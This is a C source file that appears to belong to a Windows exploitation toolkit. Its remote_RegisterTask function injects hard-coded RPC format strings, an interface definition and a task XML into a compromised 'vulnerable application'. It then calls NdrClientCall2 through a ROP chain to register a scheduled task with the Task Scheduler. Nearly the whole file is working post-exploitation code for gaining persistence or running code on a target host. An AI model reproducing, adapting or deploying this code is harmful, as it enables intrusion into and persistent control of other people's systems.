#include "rsched.h"
#include "injector.h"
#include "crp.h"

#include <stdlib.h>
#include <stdint.h>
#include <wchar.h>

/* This file implements the procedures to register tasks with the remote task scheduler
 * in the target system. To perform said task, the function remote_RegisterTask will
 * first copy a bunch of static data to the target host (these data structures here below,
 * as well as the task definition XML file provided as an argument), and then perform a call 
 * to NdrClientCall2 to actually call the task scheduler on its RPC interface from the 
 * vulnerable application.
 *
 */

static 
char format_string[] = "\x00\x00\x11\x0c\x08\x5c\x12\x08\x25\x5c\x11\x08\x25\x5c\x12\x00\x18\x00"
"\x1a\x03\x18\x00\x00\x00\x08\x00\x36\x36\x08\x40\x5c\x5b\x12\x08\x25\x5c\x12\x08\x25\x5c\x21\x03"
"\x00\x00\x29\x00\x28\x00\x01\x00\xff\xff\xff\xff\x00\x00\x4c\x00\xd8\xff\x5c\x5b\x11\x14\xc6\xff"
"\x11\x14\x02\x00\x12\x00\x02\x00\x1a\x03\x18\x00\x00\x00\x08\x00\x08\x08\x36\x36\x5c\x5b\x12\x08"
"\x25\x5c\x12\x08\x25\x5c\x11\x08\x08\x5c\x11\x14\x02\x00\x12\x00\x02\x00\x21\x03\x00\x00\x29\x54"
"\x20\x00\x01\x00\xff\xff\xff\xff\x00\x00\x12\x08\x25\x5c\x5c\x5b\x11\x14\x02\x00\x12\x00\x14\x00"
"\x1d\x00\x08\x00\x01\x5b\x15\x03\x10\x00\x08\x06\x06\x4c\x00\xf1\xff\x5b\x21\x03\x00\x00\x29\x54"
"\x10\x00\x01\x00\xff\xff\xff\xff\x00\x00\x4c\x00\xe2\xff\x5c\x5b\x11\x00\xdc\xff\x11\x14\x02\x00"
"\x12\x00\x02\x00\x21\x03\x00\x00\x29\x54\x28\x00\x01\x00\xff\xff\xff\xff\x00\x00\x4c\x00\xc0\xff"
"\x5c\x5b\x12\x00\x02\x00\x21\x03\x00\x00\x29\x00\x08\x00\x01\x00\xff\xff\xff\xff\x00\x00\x12\x08"
"\x05\x5c\x5c\x5b\x11\x04\xa0\xff\x12\x00\x02\x00\x15\x01\x10\x00\x06\x06\x06\x06\x06\x06\x06\x06"
"\x5c\x5b\x11\x14\x02\x00\x12\x00\x02\x00\x21\x01\x00\x00\x29\x54\x28\x00\x01\x00\xff\xff\xff\xff"
"\x00\x00\x4c\x00\xd8\xff\x5c\x5b\x11\x04\xd2\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x32\x48"
"\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x24\x00\x44\x02\x0a\x01\x00\x00\x00\x00\x00\x00\x00\x00"
"\x50\x21\x00\x00\x08\x00\x70\x00\x08\x00\x08\x00\x32\x48\x00\x00\x00\x00\x01\x00\x50\x00\x18\x00"
"\x08\x00\x47\x0a\x0a\x05\x00\x00\x01\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x06\x00\x0b\x01\x08\x00"
"\x0c\x00\x48\x00\x10\x00\x08\x00\x0b\x00\x18\x00\x06\x00\x48\x00\x20\x00\x08\x00\x48\x00\x28\x00"
"\x08\x00\x0b\x00\x30\x00\x0e\x00\x13\x20\x38\x00\x3e\x00\x13\x20\x40\x00\x42\x00\x70\x00\x48\x00"
"\x08\x00\x32\x48\x00\x00\x00\x00\x02\x00\x28\x00\x1c\x00\x08\x00\x47\x05\x0a\x01\x00\x00\x00\x00"
"\x00\x00\x00\x00\x0b\x01\x00\x00\x0c\x00\x0b\x01\x08\x00\x0c\x00\x48\x01\x10\x00\x08\x00\x13\x20"
"\x18\x00\x3e\x00\x70\x00\x20\x00\x08\x00\x32\x48\x00\x00\x00\x00\x03\x00\x20\x00\x08\x00\x08\x00"
"\x46\x04\x0a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x01\x00\x00\x0c\x00\x0b\x00\x08\x00\x06\x00"
"\x48\x00\x10\x00\x08\x00\x70\x00\x18\x00\x08\x00\x32\x48\x00\x00\x00\x00\x04\x00\x20\x00\x08\x00"
"\x08\x00\x46\x04\x0a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x01\x00\x00\x0c\x00\x0b\x01\x08\x00"
"\x0c\x00\x48\x00\x10\x00\x08\x00\x70\x00\x18\x00\x08\x00\x32\x48\x00\x00\x00\x00\x05\x00\x20\x00"
"\x08\x00\x08\x00\x47\x04\x0a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x01\x00\x00\x0c\x00\x48\x00"
"\x08\x00\x08\x00\x13\x20\x10\x00\x3e\x00\x70\x00\x18\x00\x08\x00\x32\x48\x00\x00\x00\x00\x06\x00"
"\x38\x00\x2c\x00\x40\x00\x47\x07\x0a\x03\x01\x00\x00\x00\x00\x00\x00\x00\x0b\x01\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00";

static
char proc_format_string[] = "\x32\x48\x00\x00\x00\x00\x01\x00\x50\x00\x18\x00\x08\x00\x47\x0a\x0a"
"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x06\x00\x0b\x01\x08\x00\x0c\x00\x48\x00\x10"
"\x00\x08\x00\x0b\x00\x18\x00\x06\x00\x48\x00\x20\x00\x08\x00\x48\x00\x28\x00\x08\x00\x0b\x00\x30"
"\x00\x0e\x00\x13\x20\x38\x00\x3e\x00\x13\x20\x40\x00\x42\x00\x70\x00\x48\x00\x08\x00\x32\x48\x00"
"\x00\x00\x00\x00\x00\x00";

static
char rpc_client_interface[] = "\x60\x00\x00\x00\x49\x59\xd3\x86\xc9\x83\x44\x40\xb4\x24\xdb\x36"
"\x32\x31\xfd\x0c\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60"
"\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

static
char midl_stub_desc[] = "\xd0\xd4\xfc\x6b\xf7\x7f\x00\x00\xf5\x15\xf6\x6b\xf7\x7f\x00\x00\xa8\x17"
"\xf6\x6b\xf7\x7f\x00\x00\xe8\x28\xfe\x6b\xf7\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x32\xcf"
"\xfc\x6b\xf7\x7f\x00\x00\x01\x00\x00\x00\x02\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6e\x02"
"\x01\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

static char *rpc_binding_string = "86d35949-83c9-4044-b424-db363231fd0c@ncalrpc:";

/* Remote addresses where these data structures will be copied to will be defined
 * as global variables, as to set them once and keep them here in case multiple calls
 * were to be required.
 *
 */
static uint64_t r_midl_stub_desc = 0;
static uint64_t r_rpc_client_interface = 0;
static uint64_t r_proc_format_string = 0;
static uint64_t r_format_string = 0;
static uint64_t r_binding_handle = 0;

#define COPY_TO_TARGET(local_buffer, local_r_address)\
    if (local_r_address == 0) {\
        if ((ret = remote_malloc(sizeof(local_buffer), &local_r_address)) < 0) {\
            local_r_address = 0;\
            return ret;\
        }\
        if ((ret = copy_to_target(local_r_address, local_buffer, sizeof(local_buffer))) < 0) {\
            local_r_address = 0;\
            return ret;\
        }\
    }

// ------------------------------------------------------------------------------------
// remote_BindingFromString
// ------------------------------------------------------------------------------------

static int32_t remote_BindingFromString(char *binding_string, uint64_t *out_handle) {
    int32_t ret = 0;
    
    printf("[*] (remote_BindingFromString) Executing remote RpcBindingFromStringBindingA.\n");
    
    uint64_t data_size;
    uint8_t *data = make_single_string_data(binding_string, &data_size);
    uint8_t *out;
    
    if ((ret = remote_find_and_call(
            "rpcrt4.dll",
            "RpcBindingFromStringBindingA",
            data,
            data_size,
            &out,
            2, // argc
            MAKE_REFERENCE(1),
            get_out_storage_base() + 8)) < 0) {
                
        return ret;
    }
    
    *out_handle = *(uint64_t*)(out + 8);
    
    printf("[*] (remote_BindingFromString) Retrieved handle 0x%llx.\n", *out_handle);
    
    free(data);
    return ret;
}

// ------------------------------------------------------------------------------------
// remote_GetBindingHandle
// ------------------------------------------------------------------------------------

int32_t remote_GetSchedBindingHandle(uint64_t *out_handle) {
    return remote_BindingFromString(rpc_binding_string, out_handle);
}

// ------------------------------------------------------------------------------------
// remote_RegisterTask
// ------------------------------------------------------------------------------------

int32_t remote_RegisterTask(uint64_t handle, wchar_t *task_path, wchar_t *task_xml) {
    int32_t ret;
    
    /* Find malloc and free in target's address space. These are required
     * to fill the midl_stub_desc structure later.
     *
     */
    uint64_t r_module_base = 0;
    uint64_t r_malloc = 0;
    uint64_t r_free = 0;
    
    if ((ret = remote_LoadLibrary("ucrtbase.dll", &r_module_base)) < 0) {
        return ret;
    }
    if ((ret = remote_GetProcAddress(r_module_base, "malloc", &r_malloc)) < 0) {
        return ret;
    }
    if ((ret = remote_GetProcAddress(r_module_base, "free", &r_free)) < 0) {
        return ret;
    }
    
    /* Copy required static data to remote host. Structure midl_stub_desc
     * will be copied later once it has been filled with the addresses where
     * these have been copied to.
     *
     */
    COPY_TO_TARGET(proc_format_string, r_proc_format_string);
    
    COPY_TO_TARGET(format_string, r_format_string);
    
    COPY_TO_TARGET(rpc_client_interface, r_rpc_client_interface);
    
    /* Copy binding handle to remote host.
     *
     */
    uint8_t binding_handle_buffer[sizeof(uint64_t)];
    memcpy(&binding_handle_buffer, (uint8_t*)&handle, sizeof(uint64_t));
        
    COPY_TO_TARGET(binding_handle_buffer, r_binding_handle);
    
    /* Set fields in midl_stub_desc and copy structure to remote host.
     *
     */
    ((uint64_t*)(midl_stub_desc))[0] = r_rpc_client_interface;
    ((uint64_t*)(midl_stub_desc))[1] = r_malloc; 
    ((uint64_t*)(midl_stub_desc))[2] = r_free;
    ((uint64_t*)(midl_stub_desc))[3] = r_binding_handle;
    ((uint64_t*)(midl_stub_desc))[8] = r_format_string;
    
    COPY_TO_TARGET(midl_stub_desc, r_midl_stub_desc);
    
    /* Copy task XML definition to remote host.
     *
     */
    uint64_t r_task_xml;
    uint64_t task_xml_byte_length = 2*wcslen(task_xml) + 2;
    
    if (remote_malloc(task_xml_byte_length, &r_task_xml) < 0) {
        return 1;
    }
    if (copy_to_target(r_task_xml, (uint8_t*)task_xml, task_xml_byte_length) < 0) {
        return 1;
    }
    
    /* memset to clean output argument; if they are not null, 
     * NdrClientCall2 seems to break during unmarshalling.
     *
     */
    remote_memset(get_out_storage_base(), 0, 3*sizeof(uint64_t));

    /* Perform RPC to Task Scheduler to register task.
     *
     */    
    uint64_t data_size;
    uint8_t *data = make_single_wstring_data(task_path, &data_size);
    
    printf("[*] (remote_RegisterTask) Performing RPC call in remote host.\n");
    
    if ((ret = remote_find_and_call(
            "rpcrt4.dll",
            "NdrClientCall2",
            data, // ptr to static data to be sent w/ ROP chain.
            data_size,
            0,
            11, // argc
            r_midl_stub_desc,                     // arg1 (rcx)
            r_proc_format_string,                 // arg2 (rdx)
            MAKE_REFERENCE(1),                    // arg3 (r8)
            r_task_xml,                           // arg4 (r9)
            2LL,                                  // arg5
            0LL,                                  // arg6
            0LL,                                  // arg7
            0LL,                                  // arg8
            0LL,                                  // arg9
            get_out_storage_base() + 8,           // arg10
            get_out_storage_base() + 16)) < 0) {  // arg11
                
        return ret;
    }
    
    printf("[*] Task should have been registered, check the task scheduler.\n");
    
    free(data);
    return ret;
}
